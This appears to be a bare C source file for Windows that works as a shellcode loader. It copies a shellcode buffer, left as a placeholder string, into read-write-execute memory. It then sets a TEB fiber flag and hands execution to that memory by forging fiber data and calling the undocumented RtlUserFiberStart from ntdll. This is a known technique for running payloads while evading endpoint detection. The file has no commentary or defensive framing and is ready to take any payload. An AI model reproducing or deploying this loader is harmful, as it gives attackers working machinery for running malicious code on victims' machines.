#include <stdio.h>
#include <Windows.h>

#define TEB_FIBERDATA_PTR_OFFSET 0x17ee
#define LPFIBER_RIP_OFFSET 0x0a8

unsigned char op[] = "shellcode here";

typedef int(WINAPI* tRtlUserFiberStart)(); 

int main() {
    HMODULE hMod = GetModuleHandleA("ntdll");
    if (!hMod) { return -1; }
    tRtlUserFiberStart lpRtlUserFiberStart = (tRtlUserFiberStart) GetProcAddress(hMod, "RtlUserFiberStart");
    if (!lpRtlUserFiberStart) { return -1; }

    _TEB* teb = NtCurrentTeb();
    NT_TIB* tib = (NT_TIB*)teb;
    void* pTebFlags = (void*)((uintptr_t)teb + TEB_FIBERDATA_PTR_OFFSET);
    *(char*)pTebFlags = *(char*)pTebFlags | 0b100;

    LPVOID addr = VirtualAlloc(NULL, sizeof(op), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    RtlMoveMemory(addr, op, sizeof(op));

    uintptr_t lpDummyFiberData = (uintptr_t)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 0x100);
    *(LPVOID*)(lpDummyFiberData + LPFIBER_RIP_OFFSET) = addr; 

    __writegsqword(0x20, lpDummyFiberData);
    lpRtlUserFiberStart();
}
